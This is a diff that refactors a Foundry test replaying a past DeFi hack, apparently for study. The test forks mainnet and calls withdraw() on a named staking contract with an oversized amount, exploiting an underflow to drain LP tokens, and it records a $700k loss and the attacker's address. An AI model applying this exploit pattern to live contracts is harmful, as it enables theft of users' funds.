@@ -2,7 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 
 // @KeyInfo - Total Lost : 700k
 // Attacker : 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0
@@ -12,23 +12,24 @@ import "./../interface.sol";
 // Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6
 
 interface IStakingRewards {
-
     function withdraw(uint256 amount) external;
-
 }
 
 contract AttackContract is Test {
-
-    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
+    IStakingRewards constant StakingRewards =
+        IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
     IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);
 
     function setUp() public {
-        cheat.createSelectFork("mainnet", 14_421_983); // Fork mainnet at block 14421983
+        vm.createSelectFork("mainnet", 14_421_983); // Fork mainnet at block 14421983
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "Before exploiting, Attacker UniLP Balance",
+            uniLP.balanceOf(address(this)),
+            18
+        );
 
         StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.
 
@@ -41,7 +42,10 @@ contract AttackContract is Test {
         _totalSupply = _totalSupply - amount;
         _balances[user] = _balances[user] - amount;   //<---- underflow here.
         */
-        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "After exploiting, Attacker UniLP Balance",
+            uniLP.balanceOf(address(this)),
+            18
+        );
     }
-
 }
